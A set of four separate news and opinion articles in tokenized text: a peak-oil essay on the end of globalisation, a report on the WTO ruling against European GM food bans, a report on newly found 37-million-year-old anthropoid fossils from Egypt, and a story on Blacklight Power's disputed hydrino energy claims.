It may be significant that the first collapse of globalisation occurred as the coal economy was transitioning into an oil economy , with deep geo-political implications for who had oil ( America ) and those who might seek to control the other major region closest to Europe that possessed it ( then the Caspian , since Arabian oil was as yet undiscovered ) .
The first world war was settled by those nations ( Britain and France ) that were friendly with the greatest producer of oil most readily accessed .
Germany was the loser and again in the reprise for its poor access to oil .
Japan suffered similarly .
We are now due for another folding up of the periodic global trade fair as the industrial nations enter the tumultuous era beyond the global oil production peak , which I have named the long emergency .
The economic distortions and perversities that have built up in the current era are not hard to see , though our leaders dread to acknowledge them .
The dirty secret of the US economy for at least a decade now is that it has come to be based on the ceaseless elaboration of a car - dependent suburban infrastructure - McHousing estates , eight - lane highways , big - box chain stores , hamburger stands - that has no future as a living arrangement in an oil - short future .
The American suburban juggernaut can be described succinctly as the greatest misallocation of resources in the history of the world .
The mortgages , bonds , real estate investment trusts and derivative financial instruments associated with this tragic enterprise must make the judicious goggle with wonder and nausea .
Add to this grim economic picture a far - flung military contest , already under way , really , for control of the world 's remaining oil , and the scene grows darker .
Two - thirds of that oil is in the possession of people who resent the west ( America in particular ) , many of whom have vowed to destroy it .
Both America and Britain have felt the sting of freelance asymmetrical war - makers not associated with a particular state but with a transnational religious cause that uses potent small arms and explosives to unravel western societies and confound their defences .
China , a supposed beneficiary of globalisation , will be as desperate for oil as all the other players , and perhaps more ruthless in seeking control of the supplies , some of which they can walk to .
Of course , it is hard to imagine the continuation of American chain stores ' manufacturing supply lines with China , given the potential for friction .
Even on its own terms , China faces issues of environmental havoc , population overshoot , and political turmoil - orders of magnitude greater than anything known in Europe or America .
Viewed through this lens , the sunset of the current phase of globalisation seems dreadfully close to the horizon .
The American public has enjoyed the fiesta , but the blue - light special orgy of easy motoring , limitless air - conditioning , and super - cheap products made by factory slaves far far away is about to close down .
Globalisation is finished .
The world is about to become a larger place again .

Just a few years ago , World Trade Organisation officials used to act hurt when described by social activists as irresponsible , secretive bureaucrats who trampled over national sovereignty and placed free trade over the environment or human rights .
But that was when the global - trade policeman ruled on disputes that had little bearing on Europeans .
The WTO court 's latest ruling will greatly increase the number of people who believe the organisation needs radical reform , if not burial .
This week three judges emerged after years of secret deliberation to rule that Europe had imposed a de facto ban on GM food imports between 1999 and 2003 , violating WTO rules .
The court also ruled that Austria , France , Germany , Greece , Italy and Luxembourg had no legal grounds to impose their own unilateral import bans .
" Europe guilty ! " shouted the US press .
" This is glorious news for the Bush administration , " said one blogger .
Actually , the judges said much more , but in true WTO style no one has been allowed to know what .
A few bureaucrats in the US , EU , Argentina and Canada have reportedly seen the full 1,045 - page report , and an edited summary of some of its conclusions has been leaked .
But no one , it seems , will take responsibility for the ruling , which may force the EU to pay hundreds of millions of dollars to compensate some of the world 's most heavily subsidised farmers , and could change the laws of at least six countries that have imposed GM bans .
In fact the US has mostly won a lot of new enemies .
Rather than going away , as the biotech companies and Washington fervently hoped , the opposition to GM foods seems to have been growing since 2004 when the case was brought to the WTO .
Europe , its member states and its consumers all rejected the ruling last week , making the WTO look even more out of touch and incompetent to rule on issues about the environment , health and consumer choice .
The European commission , which has been trying to force GM crops into Europe over the heads of its member states , says the ruling is " irrelevant " because its laws have already been changed .
Meanwhile , individual countries who dislike being told what to eat or grow by the EC as much as the WTO say they will resist any attempts to make them accept GM .
In the past few days Hungary has declared that it is in its economic interests to remain GM - free , and Greece and Austria have affirmed their total opposition to the crops .
Italy has called the WTO ruling " unbalanced " and Poland 's prime minister has pledged to keep the country GM - free .
Local government is even more opposed : more than 3,500 elected councils in 170 regions of Europe have declared themselves GM - free .
There is little the WTO , the EC or the US can do in face of this coalition of the unwilling .
If the US again tries to impose its GM products on Europe - as it did in the 90s , sparking the whole debacle - the attempt will backfire .
Europe 's biotech industry may now try to force the EC to use the WTO judgment to get the six countries with import bans to repeal anti-GM laws , but it will meet an even broader , more determined movement .
In fact , Washington and the US companies are not that bothered by Europe 's predictable reaction .
Europe has all but dropped off the world 's GM map .
The companies and the supermarkets know there is little or no demand for GM crops , and that Europe 's subsidised farmers are reluctant to alienate the public further by growing them .
It is now clear that the real reason the US took Europe to the WTO court was was to make it easier for its companies to prise open regulatory doors in China , India , south - east Asia , Latin America and Africa , where most US exports now go .
This is where millions of tonnes of US food aid heads , and where US GM companies are desperate to have access , buying up seed companies and schmoozing presidents and prime ministers .
More than two - thirds of exported US corn now goes to Asia and Africa , where once it went to Europe .
As the Monsanto man said this week about the WTO ruling : " Our feeling is that it 's important for countries other than the EU to have science - based regulatory frameworks . "
Like the tobacco industry , GM companies are now focusing almost exclusively on developing countries .
But here the industry is meeting stiff opposition from powerful unions and farming groups .
Brazil has caved in , but Bolivia may shortly become the first Latin American country to fully reject GM .
Some Indian states are deeply opposed , and there have been major demonstrations in the Philippines , Korea , Indonesia and elsewhere .
India 's largest farmers ' organisation this week said the result of the WTO verdict would be that the US would become more aggressive in dumping GM food on to developing countries .
The US maintains that through the WTO it has won a great victory for free trade , and passed a significant milestone in US attempts " to have GM crops accepted throughout the world " .
Perhaps , but the battle is far from won , and in the meantime anyone opposing the crops is being reclassed as an enemy of America .
Within hours of the WTO decision , José Bové , the French farmer who has led European protests , arrived in New York to give an invited talk to Cornell students about GM food - and was immediately sent back to France by the US government .

The fossil teeth and jawbones of two new species of tiny monkey - like creatures that lived 37 million years ago have been sifted from ancient sediments in the Egyptian desert , researchers have reported .
They said their findings firmly establish that the common ancestor of living anthropoids — including monkeys , apes and humans — arose in Africa and that the group had already begun branching into many species by that time .
Also , they said , one of the creatures appears to have been nocturnal , the first example of a nocturnal early anthropoid .
The researchers published their discovery of the two new species — named Biretia fayumensis and Biretia megalopsis — in an article in the October 14 , 2005 , issue of the journal Science .
First author on the paper was Erik Seiffert of the University of Oxford and Oxford University Museum of Natural History .
Other co-authors were Elwyn Simons and Prithijit Chatrath of Duke University , William Clyde of the University of New Hampshire , James Rossie of Stony Brook University , Yousry Attia of the Egyptian Geological Museum , Thomas Bown of Erathem - Vanir Geological in Boulder , Colo. , and Mark Mathison of Iowa State University .
The research was supported by the National Science Foundation and the Leakey Foundation .
Field work in Egypt was facilitated by the Egyptian Mineral Resources Authority and the Egyptian Geological Museum .
The researchers discovered the fossils over the course of the last few years at a site called Birket Qarun Locality 2 ( BQ - 2 ) about 60 miles southwest of Cairo in the Fayum desert .
BQ - 2 has only been systematically excavated for about four years , said Seiffert , in contrast to a much younger Fayum site , called L - 41 , which has been explored for the last 22 years by Simons and his colleagues .
“ BQ - 2 and surrounding localities have tremendous potential , which is exciting because they are so much older than other Fayum sites , ” said Seiffert .
“ There will certainly be much more information about early anthropoid evolution coming out of BQ - 2 over the next few years . ”
The sediments at BQ - 2 lie nearly 750 feet below those of L - 41 and were dated at around 37 million years old by measuring telltale variations in magnetic fields in the sediments due to ancient fluctuations in the earth ’s magnetic fields .
According to Simons , other anthropoids exist at BQ - 2 and will soon be described ,
The latest fossils of the new species consist of tiny teeth and jaws , whose shapes yield critical clues about the species whose mouths they once occupied .
For example , a tooth root from the species Biretia megalopsis is truncated , indicating that it had to make room for the larger eyesocket of a nocturnal animal .
“ These finds seem to indicate that Biretia megalopsis must have had very large eyes , and so was likely nocturnal , ” said Seiffert .
“ This has never been documented in an early anthropoid .
The simplest explanation is that Biretia ’s nocturnality represents an evolutionary reversal from a diurnal ancestor , but that conclusion is based solely on the probable pattern of relationships .
If down the road we find out that our phylogeny was wrong , Biretia could end up being very significant for our understanding of the origin of anthropoid activity patterns . ”
According to Simons , analyses of the teeth of the two species clearly place them as members of a group called parapithecoids , known as “ stem ” anthropoids because they constitute the species of early creatures from which the subsequent “ crown ” anthropoid line arose .
“ The finding of these parapithecoids from such an ancient time confirms that crown anthropoids — a group including all modern anthropoids — have their earliest known beginnings in Africa , ” said Simons .
“ They show that findings by other researchers of isolated examples of possible higher primate fossils in Asia do not constitute evidence of an ancestral crown anthropoid lineage there . ”
According to Seiffert , the latest findings help fill in the gap between later anthropoids and the oldest undisputed anthropoid , called Algeripithecus , found in Algeria , which lived around 45 million years ago .
That species had been characterized by only a few teeth , which precluded significant insight into the species , said Seiffert .
Seiffert also noted that previously , the only evidence for anthropoids at 37 million years ago in Africa was a single tooth , attributed to a species called Biretia piveteaui .
What ’s more , the latest discoveries of the two species suggest that a 57 - million - year - old African primate called Altiatlasius from Morocco might even be the earliest anthropoid ancestor .

It seems too good to be true : a new source of near - limitless power that costs virtually nothing , uses tiny amounts of water as its fuel and produces next to no waste .
If that does not sound radical enough , how about this : the principle behind the source turns modern physics on its head .
Randell Mills , a Harvard University medic who also studied electrical engineering at Massachusetts Institute of Technology , claims to have built a prototype power source that generates up to 1,000 times more heat than conventional fuel .
Independent scientists claim to have verified the experiments and Dr Mills says that his company , Blacklight Power , has tens of millions of dollars in investment lined up to bring the idea to market .
And he claims to be just months away from unveiling his creation .
The problem is that according to the rules of quantum mechanics , the physics that governs the behaviour of atoms , the idea is theoretically impossible .
" Physicists are quite conservative .
It 's not easy to convince them to change a theory that is accepted for 50 to 60 years .
I do n't think [ Mills 's ] theory should be supported , " said Jan Naudts , a theoretical physicist at the University of Antwerp .
What has much of the physics world up in arms is Dr Mills 's claim that he has produced a new form of hydrogen , the simplest of all the atoms , with just a single proton circled by one electron .
In his " hydrino " , the electron sits a little closer to the proton than normal , and the formation of the new atoms from traditional hydrogen releases huge amounts of energy .
This is scientific heresy .
According to quantum mechanics , electrons can only exist in an atom in strictly defined orbits , and the shortest distance allowed between the proton and electron in hydrogen is fixed .
The two particles are simply not allowed to get any closer .
According to Dr Mills , there can be only one explanation : quantum mechanics must be wrong .
" We 've done a lot of testing .
We 've got 50 independent validation reports , we 've got 65 peer - reviewed journal articles , " he said .
" We ran into this theoretical resistance and there are some vested interests here .
People are very strong and fervent protectors of this [ quantum ] theory that they use . "
Rick Maas , a chemist at the University of North Carolina at Asheville ( UNC ) who specialises in sustainable energy sources , was allowed unfettered access to Blacklight 's laboratories this year .
" We went in with a healthy amount of scepticism .
While it would certainly be nice if this were true , in my position as head of a research institution , I really would n't want to make a mistake .
The last thing I want is to be remembered as the person who derailed a lot of sustainable energy investment into something that was n't real . "
But Prof Maas and Randy Booker , a UNC physicist , left under no doubt about Dr Mill 's claims .
" All of us who are not quantum physicists are looking at Dr Mills 's data and we find it very compelling , " said Prof Maas .
" Dr Booker and I have both put our professional reputations on the line as far as that goes . "
Dr Mills 's idea goes against almost a century of thinking .
When scientists developed the theory of quantum mechanics they described a world where measuring the exact position or energy of a particle was impossible and where the laws of classical physics had no effect .
The theory has been hailed as one of the 20th century 's greatest achievements .
But it is an achievement Dr Mills thinks is flawed .
He turned back to earlier classical physics to develop a theory which , unlike quantum mechanics , allows an electron to move much closer to the proton at the heart of a hydrogen atom and , in doing so , release the substantial amounts of energy he seeks to exploit .
Dr Mills 's theory , known as classical quantum mechanics and published in the journal Physics Essays in 2003 , has been criticised most publicly by Andreas Rathke of the European Space Agency .
In a damning critique published recently in the New Journal of Physics , he argued that Dr Mills 's theory was the result of mathematical mistakes .
Dr Mills argues that there are plenty of flaws in Dr Rathke 's critique .
" His paper 's riddled with mistakes .
We 've had other physicists contact him and say this is embarrassing to the journal and [ Dr Rathke ] wo n't respond , " said Dr Mills .
While the theoretical tangle is unlikely to resolve itself soon , those wanting to exploit the technology are pushing ahead .
" We would like to understand it from an academic standpoint and then we would like to be able to use the implications to actually produce energy products , " said Prof Maas .
" The companies that are lining up behind this are household names . "
Dr Mills will not go into details of who is investing in his research but rumours suggest a range of US power companies .
It is well known also that Nasa 's institute of advanced concepts has funded research into finding a way of using Blacklight 's technology to power rockets .
According to Prof Maas , the first product built with Blacklight 's technology , which will be available in as little as four years , will be a household heater .
As the technology is scaled up , he says , bigger furnaces will be able to boil water and turn turbines to produce electricity .
In a recent economic forecast , Prof Maas calculated that hydrino energy would cost around 1.2 cents ( 0.7 p ) per kilowatt hour .
This compares to an average of 5 cents per kWh for coal and 6 cents for nuclear energy .
" If it 's wrong , it will be proven wrong , " said Kert Davies , research director of Greenpeace USA .
" But if it 's right , it is so important that all else falls away .
It has the potential to solve our dependence on oil .
Our stance is of cautious optimism . "
Alternative energy
Cold fusion
More than 16 years after chemists ' claims to have created a star in a jar imploded in acrimony , the US government has said it might fund more research .
Mainstream physicists still balk at reports that a beaker of cold water and metal electrodes can produce excess heat , but a hardy band of scientists across the world refuse to let the dream die .
Methane hydrates
The US and Japan are leading attempts to tap this source of fossil fuel buried beneath the seabed and Arctic permafrost .
A mixture of ice and natural gas , hydrates are believed to contain more carbon than existing reserves of oil , coal and gas put together .
Solar chimneys
Sunlight heats trapped air , which rises through a giant chimney and drives turbines .
Leonardo da Vinci designed such a power tower and the Australian company Enviromission plans to build one .
Despite being scaled down recently , the concrete chimney will still stand some 700 metres over the outback .
Nuclear fusion
Turns nuclear power on its head by combining atoms rather than splitting them to release energy - copying the reaction at the heart of the sun .
After years of arguments the world has agreed to build a test reactor to see whether it works on a commercial scale .
Called Iter , it could be switched on within a decade .
Wave generators
No longer a dead duck , the hopes of engineers are riding on bobbing floats again .
The British company Trident Energy recently unveiled a design that uses a linear generator to convert the motion of the sea into electricity .
A wave farm just a few hundred metres across could power 62,000 homes .
